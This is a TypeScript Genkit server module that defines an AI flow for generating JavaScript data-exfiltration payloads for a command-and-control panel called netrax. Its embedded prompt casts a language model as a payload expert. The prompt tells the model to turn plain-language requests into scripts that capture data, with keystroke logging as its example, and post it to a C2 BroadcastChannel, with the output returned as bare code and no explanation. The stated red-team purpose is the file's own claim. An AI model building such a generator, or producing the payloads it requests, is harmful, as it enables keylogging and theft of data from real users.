'use server';
/**
 * @fileOverview An AI flow for generating JavaScript payloads for data exfiltration.
 *
 * - generateJsPayload - Generates a script based on a natural language prompt.
 * - JsPayloadGeneratorInput - The input type for the function.
 * - JsPayloadGeneratorOutput - The return type for the function.
 */

import {ai} from '@/ai/genkit';
import {z} from 'genkit';

const JsPayloadGeneratorInputSchema = z.object({
  prompt: z.string().describe('A natural language description of the desired payload actions.'),
});
type JsPayloadGeneratorInput = z.infer<typeof JsPayloadGeneratorInputSchema>;

const JsPayloadGeneratorOutputSchema = z.object({
  payload: z.string().describe('The generated JavaScript payload.'),
});
type JsPayloadGeneratorOutput = z.infer<typeof JsPayloadGeneratorOutputSchema>;

export async function generateJsPayload(input: JsPayloadGeneratorInput): Promise<JsPayloadGeneratorOutput> {
  return jsPayloadGeneratorFlow(input);
}

const prompt = ai.definePrompt({
  name: 'jsPayloadGeneratorPrompt',
  input: {schema: JsPayloadGeneratorInputSchema},
  output: {schema: JsPayloadGeneratorOutputSchema},
  prompt: `You are an expert in creating JavaScript payloads for red team exercises.
Your task is to convert a natural language prompt into a valid JavaScript payload.

The script must use the BroadcastChannel API to send captured data back to the C2 panel.
The C2 channel is named 'netrax_c2_channel'.
All exfiltrated data must be sent via 'channel.postMessage()' as an object with 'type' and 'data' fields.

You must wrap your entire script in an immediately invoked function expression (IIFE) to avoid polluting the global scope.

Example of sending keystrokes:
channel.postMessage({ type: 'keystroke', data: { key: e.key } });

Prompt: {{{prompt}}}

Generate only the JavaScript code. Do not include any explanations, markdown formatting, or conversational text.
`,
});

const jsPayloadGeneratorFlow = ai.defineFlow(
  {
    name: 'jsPayloadGeneratorFlow',
    inputSchema: JsPayloadGeneratorInputSchema,
    outputSchema: JsPayloadGeneratorOutputSchema,
  },
  async input => {
    const {output} = await prompt(input);
    // Ensure the payload is wrapped in an IIFE as a fallback
    const finalPayload = output!.payload.trim();
    if (finalPayload.startsWith('(function()') && finalPayload.endsWith('})();')) {
        return { payload: finalPayload };
    }
    return { payload: `(function() {\n${finalPayload}\n})();` };
  }
);
